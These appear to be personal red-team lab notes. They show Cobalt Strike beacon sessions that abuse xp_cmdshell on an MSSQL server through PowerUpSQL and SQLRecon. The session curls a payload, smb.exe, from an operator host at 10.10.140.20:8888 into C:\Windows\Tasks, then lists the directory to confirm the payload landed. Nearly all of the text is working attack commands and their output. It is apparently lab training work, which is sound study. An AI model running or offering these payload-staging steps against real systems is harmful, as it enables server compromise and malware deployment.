import `PowerUpSQL`
`powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1`

to put the `smb.exe` file onto the `MSSQL` server in the `C:\Windows\Tasks\smb.exe` directory
```powershell
[02/18 00:46:53] beacon> powershell Get-SQLQuery -Instance "db.kato.org,1433" -Query "EXEC xp_cmdshell 'cmd /c curl http://10.10.140.20:8888/smb.exe -o `"C:\Windows\Tasks\smb.exe`"';"
[02/18 00:46:53] [*] Tasked beacon to run: Get-SQLQuery -Instance "db.kato.org,1433" -Query "EXEC xp_cmdshell 'cmd /c curl http://10.10.140.20:8888/smb.exe -o `"C:\Windows\Tasks\smb.exe`"';"
[02/18 00:46:53] [+] host called home, sent: 665 bytes
[02/18 00:47:03] [+] received output:
#< CLIXML

[02/18 00:47:04] [+] received output:

output                                                                                                                 
------                                                                                                                 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                        
                                 Dload  Upload   Total   Spent    Left  Speed                                          
...                                                                                                                    
  0    0     0      0      0 --:--:--  0:00:03 --:--:--     0...                                                       
  0      0 --:--:--  0:00:06 --:--:--     0...                                                                         
2  0:00:09  0:03:33  2948...                  
```
shows in the `cobaltstrike` `weblog` that the file was pulled over
![[Pasted image 20240217194857.png]]
two methods to check that the file is actually there `Get-SQLQuery`
```powershell
[02/18 00:49:22] beacon> powershell Get-SQLQuery -Instance "db.kato.org,1433" -Query "EXEC xp_cmdshell 'cmd /c dir `"C:\Windows\Tasks\`"';"
[02/18 00:49:22] [*] Tasked beacon to run: Get-SQLQuery -Instance "db.kato.org,1433" -Query "EXEC xp_cmdshell 'cmd /c dir `"C:\Windows\Tasks\`"';"
[02/18 00:49:23] [+] host called home, sent: 545 bytes
[02/18 00:49:24] [+] received output:
#< CLIXML

output                                            
------                                            
 Volume in drive C has no label.                  
 Volume Serial Number is 44F5-000D                
                                                  
 Directory of C:\Windows\Tasks                    
                                                  
02/18/2024  12:47 AM    <DIR>          .          
10/06/2022  12:37 PM    <DIR>          ..         
02/18/2024  12:47 AM           350,720 smb.exe    
               1 File(s)        350,720 bytes     
               2 Dir(s)  17,196,249,088 bytes free

```
`SQLRecon`
```powershell
[02/18 00:50:56] beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:db.kato.org,1433 /m:xpcmd /c:"dir C:\windows\tasks\"
[02/18 00:50:58] [*] Tasked beacon to run .NET program: SQLRecon.exe /a:wintoken /h:db.kato.org,1433 /m:xpcmd /c:"dir C:\windows\tasks\"
[02/18 00:50:58] [+] host called home, sent: 307586 bytes
[02/18 00:50:59] [+] received output:
[*] Executing 'dir C:\windows\tasks"' on db.kato.org,1433
output | 
---------
 Volume in drive C has no label. | 
 Volume Serial Number is 44F5-000D | 
 | 
 Directory of C:\windows\tasks | 
 | 
02/18/2024  12:47 AM    <DIR>          . | 
10/06/2022  12:37 PM    <DIR>          .. | 
02/18/2024  12:47 AM           350,720 smb.exe | 
               1 File(s)        350,720 bytes | 
               2 Dir(s)  17,196,232,704 bytes free | 
```

